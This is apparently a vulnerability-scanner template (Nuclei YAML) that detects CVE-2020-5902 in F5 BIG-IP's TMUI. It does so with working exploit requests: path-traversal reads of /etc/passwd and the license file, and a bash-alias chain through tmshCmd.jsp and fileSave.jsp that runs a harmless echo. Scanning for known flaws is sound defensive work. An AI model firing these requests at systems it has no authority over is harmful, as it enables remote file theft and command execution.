id: CVE-2020-5902
info:
  author: madrobot & dwisiswant0
  name: F5 BIG-IP TMUI RCE
  severity: high
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: or
    part: body
    regex:
    - 'root:[x*]:0:0:'
    - BIG-IP release ([\d.]+)
    - '[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{7}'
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
  - '{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release'
  - '{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license'
- matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - h3ll0_w0Rld
  matchers-condition: and
  raw:
  - 'POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
    (KHTML, like Gecko)


    command=create%20cli%20alias%20private%20list%20command%20bash

    '
  - 'POST /tmui/locallb/workspace/fileSave.jsp HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
    (KHTML, like Gecko)


    fileName=%2Ftmp%2Fnonexistent&content=echo%20%27aDNsbDBfdzBSbGQK%27%20%7C%20base64%20-d

    '
  - 'POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
    (KHTML, like Gecko)


    command=list%20%2Ftmp%2Fnonexistent

    '
  - 'POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
    (KHTML, like Gecko)


    command=delete%20cli%20alias%20private%20list

    '
